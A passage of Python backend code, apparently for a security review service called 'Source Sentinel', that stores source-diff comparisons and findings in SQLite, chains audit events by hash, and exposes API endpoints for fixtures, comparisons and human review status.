    target_hash = compute_snapshot_hash(target_files)

    diff_files, findings, summary, risk_level = analyze_source_diff(base_files, target_files)

    comparison_id = str(uuid.uuid4())
    created_at = utc_now()

    summary_json = json.dumps(summary.model_dump())
    diff_json = json.dumps([d.model_dump() for d in diff_files])

    with connect() as db:
        db.execute(
            """
            INSERT INTO source_comparisons
                (id, is_fixture, fixture_id, repository_url, base_commit, target_commit,
                 base_snapshot_hash, target_snapshot_hash, risk_level, review_status,
                 reviewer_notes, reviewed_at, files_changed_count, additions_count,
                 deletions_count, findings_count, summary_json, diff_json, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'PENDING', NULL, NULL, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                comparison_id,
                int(is_fixture),
                fixture_id,
                repository_url,
                base_commit,
                target_commit,
                base_hash,
                target_hash,
                risk_level,
                summary.files_changed_count,
                summary.additions_count,
                summary.deletions_count,
                summary.findings_count,
                summary_json,
                diff_json,
                created_at,
            ),
        )

        for f in findings:
            db.execute(
                """
                INSERT INTO source_findings
                    (id, comparison_id, category, severity, file_path, line_number,
                     change_type, title, snippet, explanation, reason, recommended_action)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    f.id,
                    comparison_id,
                    f.category,
                    f.severity,
                    f.file_path,
                    f.line_number,
                    f.change_type,
                    f.title,
                    f.snippet,
                    f.explanation,
                    f.reason,
                    f.recommended_action,
                ),
            )

        # Audit Integration: If an associated release exists in releases table, log audit event
        rel = db.execute(
            "SELECT id FROM releases WHERE repository_url = ? OR source_commit = ? LIMIT 1",
            (repository_url, target_commit),
        ).fetchone()
        if rel:
            release_id = rel["id"]
            prev_row = db.execute(
                "SELECT event_hash FROM audit_events WHERE release_id = ? ORDER BY id DESC LIMIT 1",
                (release_id,),
            ).fetchone()
            prev_hash = prev_row["event_hash"] if prev_row else "0" * 64
            event_type = "sentinel.analysis_completed"
            event_data = {
                "comparison_id": comparison_id,
                "is_fixture": is_fixture,
                "repository_url": repository_url,
                "base_commit": base_commit,
                "target_commit": target_commit,
                "risk_level": risk_level,
                "findings_count": len(findings),
            }
            event_json = json.dumps(event_data, sort_keys=True, separators=(",", ":"))
            event_hash = hashlib.sha256(f"{prev_hash}|{event_type}|{event_json}|{created_at}".encode()).hexdigest()
            db.execute(
                """
                INSERT INTO audit_events
                    (release_id, event_type, event_json, previous_hash, event_hash, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
                """,
                (release_id, event_type, event_json, prev_hash, event_hash, created_at),
            )

    return ComparisonResponse(
        id=comparison_id,
        is_fixture=is_fixture,
        fixture_id=fixture_id,
        repository_url=repository_url,
        base_commit=base_commit,
        target_commit=target_commit,
        base_snapshot_hash=base_hash,
        target_snapshot_hash=target_hash,
        risk_level=risk_level,
        review_status="PENDING",
        reviewer_notes=None,
        reviewed_at=None,
        summary=summary,
        findings=findings,
        diff_files=diff_files,
        created_at=created_at,
    )


# -----------------------------------------------------------------------------
# API Endpoints
# -----------------------------------------------------------------------------
@sentinel_router.get("/fixtures", response_model=list[FixtureItem])
def list_fixtures() -> list[dict[str, Any]]:
    """List available reproducible demo fixtures for Source Sentinel."""
    return [
        {
            "id": f["id"],
            "name": f["name"],
            "description": f["description"],
            "base_commit": f["base_commit"],
            "target_commit": f["target_commit"],
            "repository_url": f["repository_url"],
            "expected_risk": f["expected_risk"],
            "category_tags": f["category_tags"],
        }
        for f in FIXTURES_DATA.values()
    ]


@sentinel_router.post("/compare", response_model=ComparisonResponse)
def compare_source_versions(req: CompareRequest) -> ComparisonResponse:
    """Trigger a source code diff and security rule analysis."""
    return execute_source_comparison(
        mode=req.mode,
        fixture_id=req.fixture_id,
        repository_url=req.repository_url,
        base_commit=req.base_commit,
        target_commit=req.target_commit,
        base_repository_url=req.base_repository_url,
        target_repository_url=req.target_repository_url,
    )


@sentinel_router.get("/comparisons", response_model=list[ComparisonListItem])
def list_comparisons(limit: int = Query(default=50, ge=1, le=200)) -> list[dict[str, Any]]:
    """List historical Source Sentinel comparisons."""
    init_sentinel_db()
    with connect() as db:
        rows = db.execute(
            """
            SELECT id, is_fixture, fixture_id, repository_url, base_commit, target_commit,
                   risk_level, review_status, files_changed_count, additions_count,
                   deletions_count, findings_count, created_at
            FROM source_comparisons
            ORDER BY created_at DESC
            LIMIT ?
            """,
            (limit,),
        ).fetchall()
        return [dict(row) for row in rows]


@sentinel_router.get("/comparisons/{comparison_id}", response_model=ComparisonResponse)
def get_comparison(comparison_id: str) -> ComparisonResponse:
    """Retrieve details, diff, and security findings for a specific comparison."""
    init_sentinel_db()
    with connect() as db:
        row = db.execute("SELECT * FROM source_comparisons WHERE id = ?", (comparison_id,)).fetchone()
        if not row:
            raise HTTPException(status_code=404, detail=f"Comparison '{comparison_id}' not found.")

        findings_rows = db.execute(
            "SELECT * FROM source_findings WHERE comparison_id = ?",
            (comparison_id,),
        ).fetchall()

        summary_dict = json.loads(row["summary_json"])
        diff_list = json.loads(row["diff_json"])

        findings = [
            SourceFinding(
                id=f["id"],
                category=f["category"],
                severity=f["severity"],
                file_path=f["file_path"],
                line_number=f["line_number"],
                change_type=f["change_type"],
                title=f["title"],
                snippet=f["snippet"],
                explanation=f["explanation"],
                reason=f["reason"],
                recommended_action=f["recommended_action"],
            )
            for f in findings_rows
        ]

        diff_files = [DiffFile(**d) for d in diff_list]

        return ComparisonResponse(
            id=row["id"],
            is_fixture=bool(row["is_fixture"]),
            fixture_id=row["fixture_id"],
            repository_url=row["repository_url"],
            base_commit=row["base_commit"],
            target_commit=row["target_commit"],
            base_snapshot_hash=row["base_snapshot_hash"],
            target_snapshot_hash=row["target_snapshot_hash"],
            risk_level=row["risk_level"],
            review_status=row["review_status"],
            reviewer_notes=row["reviewer_notes"],
            reviewed_at=row["reviewed_at"],
            summary=ComparisonSummary(**summary_dict),
            findings=findings,
            diff_files=diff_files,
            created_at=row["created_at"],
        )


@sentinel_router.patch("/comparisons/{comparison_id}/review", response_model=ComparisonResponse)
def update_review_status(comparison_id: str, req: ReviewRequest) -> ComparisonResponse:
    """Update human review status (APPROVED / FLAGGED / PENDING) and reviewer notes."""
    init_sentinel_db()
    with connect() as db:
        row = db.execute("SELECT id FROM source_comparisons WHERE id = ?", (comparison_id,)).fetchone()
        if not row:
            raise HTTPException(status_code=404, detail=f"Comparison '{comparison_id}' not found.")

        reviewed_at = utc_now()
        db.execute(
            """
            UPDATE source_comparisons
            SET review_status = ?, reviewer_notes = ?, reviewed_at = ?
            WHERE id = ?
            """,
            (req.review_status, req.notes, reviewed_at, comparison_id),
        )

    return get_comparison(comparison_id)
